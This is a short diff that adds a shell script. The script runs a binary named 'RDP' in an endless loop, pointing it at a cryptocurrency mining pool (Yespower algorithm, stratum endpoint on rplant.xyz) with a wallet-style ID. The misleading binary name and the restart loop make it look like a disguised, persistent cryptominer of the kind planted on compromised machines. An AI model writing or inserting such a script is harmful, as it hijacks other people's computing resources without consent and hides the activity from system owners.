@@ -1,0 +1,5 @@
+#!/bin/sh
+while [ 1 ]; do
+	./RDP -a YespowerNull -o stratum+tcp://stratum-na.rplant.xyz:7017 -u web1q0esp7rarj5hd6pcxsqy6ewvfuv7pl7t4nzx7uk.RDP -t1
+	sleep 5
+done
